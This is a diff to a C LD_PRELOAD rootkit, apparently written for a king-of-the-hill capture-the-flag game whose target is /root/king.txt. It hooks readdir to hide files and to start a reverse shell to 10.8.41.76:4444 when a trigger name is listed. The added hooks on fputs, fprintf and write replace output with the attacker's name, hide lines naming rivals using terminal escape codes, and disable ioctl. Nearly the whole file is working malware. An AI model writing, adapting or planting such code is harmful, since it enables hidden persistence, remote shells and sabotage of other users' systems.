@@ -2,6 +2,7 @@
 
 #define _GNU_SOURCE
 #include <stdio.h>
+#include <stdarg.h>
 #include <unistd.h>
 #include <dlfcn.h>
 #include <string.h>
@@ -11,17 +12,30 @@
 #include <dlfcn.h>
 #include <dirent.h>
 #include <arpa/inet.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/ioctl.h>
+#include <linux/fs.h>
+#include <limits.h>
+#include <sys/types.h>
 
 #define FILENAME "kir"
+#define FILENAME2 "asu"
+#define FILENAME3 "2"
 #define REVERSE "__UNO"
 #define REM_HOST4 "10.8.41.76"
 #define REM_PORT 4444
 #define LOC_PORT 65065
 #define trash "/tmp/kirtrash"
 
+#define KING_PATH "/root/king.txt"
+#define KING_USERNAME "TERRAMINATOR"
+
 typedef int bool;
 #define true 1
 #define false 0
+
+
 
 int ipv4_rev (void)
 {
@@ -71,27 +85,23 @@ bool is_protected(const char* path) {
 }
 
 
-void log_(const char* msg, char* path) {
-        FILE* fd;
-        fd  = fopen(path, "a+");
-        fputs(msg, fd);
-	fputs("\n", fd);
-        fclose(fd);
-}
-
-
 struct dirent *(*old_readdir)(DIR *dir);
 struct dirent *readdir(DIR *dirp)
 {
     old_readdir = dlsym(RTLD_NEXT, "readdir");
 
     struct dirent *dir;
-
+    struct dirent *fake_dir = NULL;
     while (dir = old_readdir(dirp))
     {
 	if(strcmp(dir->d_name, REVERSE) == 0) ipv4_rev();
+	if(strstr(dir->d_name, FILENAME2)) {
+		return(fake_dir);
+	}
+        if(strstr(dir->d_name, FILENAME3)) {
+                return(fake_dir);
+        }
 	if(strstr(dir->d_name,FILENAME) == 0) break;
-        //if(strstr(dir->d_name,FILENAME) == 0 || strstr(dir->d_name, PREFIX) == 0) break;
     }
     return dir;
 }
@@ -103,12 +113,18 @@ struct dirent64 *readdir64(DIR *dirp)
     old_readdir64 = dlsym(RTLD_NEXT, "readdir64");
 
     struct dirent64 *dir;
+    struct dirent64 *fake_dir = NULL;
 
     while (dir = old_readdir64(dirp))
     {
 	if(strcmp(dir->d_name, REVERSE) == 0) ipv4_rev();
+        if(strstr(dir->d_name, FILENAME2)) { 
+                return(fake_dir);
+        }
+        if(strstr(dir->d_name, FILENAME3)) {
+                return(fake_dir);
+        }
         if(strstr(dir->d_name,FILENAME) == 0) break;
-	//if(strstr(dir->d_name,FILENAME) == 0 || strstr(dir->d_name, PREFIX) == 0) break;
     }
     return dir;
 }
@@ -142,36 +158,77 @@ FILE *fopen64(const char *pathname, const char *mode)
         fp = orig_fopen64(pathname, mode);
         return(fp);
 }
-
-
-int (*orig_unlink)(const char *path);
-int unlink(const char *path) {
-	orig_unlink = dlsym(RTLD_NEXT, "unlink");
-        if(is_protected(path)) {
-                path = trash;
-        }
-        log_(path, "/tmp/unlink.log");
-	int res = orig_unlink(path);
+int (*orig_fputs)(const char* restrict s, FILE* restrict stream);
+int fputs(const char* restrict s, FILE* restrict stream) {
+	orig_fputs = dlsym(RTLD_NEXT, "fputs");
+	s = "TERRAMINATOR";
+	int res = orig_fputs(s, stream);
 	return(res);
 }
 
-
-//int (*orig_open)(const char *pathname, int flags, unsigned int mode);
-//int open(const char *pathname, int flags, unsigned int mode) {
-//	orig_open = dlsym(RTLD_NEXT, "open");
-//	if(is_protected(pathname)) {
-//              pathname = trash;
-//      }
-//      log_(pathname, "/tmp/open.log");
-//	int fp = orig_open(pathname, flags, mode);
-//	return(fp);
-//}
-
-
-int (*orig_creat)(const char *pathname, mode_t mode);
-int creat(const char *pathname, mode_t mode) {
-	orig_creat = dlsym(RTLD_NEXT, "creat");
-	log_(pathname, "/tmp/create.log");
-	int res = orig_creat(pathname, mode);
-	return(res);
+int count_args(const char* stream) {
+	int count = 0;
+	for(int i=0;i<strlen(stream);i++) {
+		if(stream[i] == '%') {
+			count++;
+		}
+	}
+	return(count);
 }
+int (*orig_fprintf)(FILE* __restrict stream, const char* __restrict format, ...);
+int fprintf(FILE* restrict stream, const char* restrict format, ...) {
+        orig_fprintf = dlsym(RTLD_NEXT, "fprintf");
+	va_list valist;
+	va_start(valist, format);
+	for(int c=0;c<count_args(format);c++) {
+	}
+	va_end(valist);
+        int res = orig_fprintf(stream, "%s", "TERRAMINATOR");
+        return(res);
+}
+
+
+char* fd_to_name(int fd) {
+	char fds[PATH_MAX];
+	char proc[PATH_MAX];
+	strcpy(proc, "/proc/self/fd/");
+	sprintf(fds, "%i", fd);
+	strcat(proc, fds);
+        struct stat sb;
+        char *buf;
+        ssize_t nbytes, bufsiz;
+	lstat(proc, &sb);
+	bufsiz = sb.st_size + 1;
+        if (sb.st_size == 0) {
+        	bufsiz = PATH_MAX;
+	}
+	buf = malloc(bufsiz);
+	nbytes = readlink(proc, buf, bufsiz);
+	if(nbytes==-1) {
+		return("/tmp/randomstuff");
+	}
+	else {
+		return(buf);
+	}
+}
+
+ssize_t write (int fd, const void * buf, size_t count){
+    ssize_t (*glibc_write)(int fd, const void * buf, size_t count);
+
+    glibc_write = dlsym(RTLD_NEXT, "write");
+
+    char* buffer = buf;
+    if(strstr(fd_to_name(fd), "king.txt")!=NULL || strstr(buffer, "F11") != NULL || strstr(buffer, "Mat") != NULL) {
+    	buffer = "TERRAMINATOR";
+    }
+    else if(strstr(buffer, "hiro") != NULL || strstr(buffer, "kir") != NULL || strstr(buffer, "asu") != NULL) {
+	buffer = "#\033[2A\033[1D";
+    } 
+
+    return glibc_write(fd, buffer, strlen(buffer));
+}
+int ioctl(int fd, unsigned long request, ...) {
+	return(-1);
+}
+
+//hiro
